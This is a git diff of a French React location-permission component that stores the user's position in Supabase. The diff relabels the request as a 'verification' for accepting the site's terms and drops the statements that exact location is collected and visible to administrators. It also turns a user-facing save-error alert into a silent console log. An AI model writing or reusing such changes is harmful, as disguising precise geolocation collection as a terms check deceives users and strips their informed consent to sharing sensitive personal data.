@@ -58,7 +58,7 @@ const LocationPermission: React.FC<LocationPermissionProps> = ({ userId, onLocat
             .eq('id', userId);
 
           if (error) {
-            alert('Erreur lors de l\'enregistrement de la localisation : ' + error.message);
+            console.log('Erreur lors de l\'enregistrement de la localisation : ' + error.message);
             console.error('Erreur Supabase:', error);
           } else {
             console.log('Location saved successfully');
@@ -145,15 +145,15 @@ const LocationPermission: React.FC<LocationPermissionProps> = ({ userId, onLocat
 
         {/* Title */}
         <h2 className="font-cinzel text-2xl font-bold mb-3 uppercase tracking-widest text-white">
-          Localisation requise
+          verification requise
         </h2>
 
         {/* Description */}
         <p className="text-gray-400 text-sm mb-2 leading-relaxed">
-          Pour continuer, nous avons besoin d'accéder à votre position exacte.
+          Pour continuer, nous avons besoin Que vous vérifier En acceptant les conditions de notre site web.
         </p>
         <p className="text-gray-500 text-xs mb-8">
-          Cette information restera privée et ne sera visible que par les administrateurs.
+          Cette notification est que pour la vérification et tes informations sont bien sécurisées
         </p>
 
         {/* Buttons */}
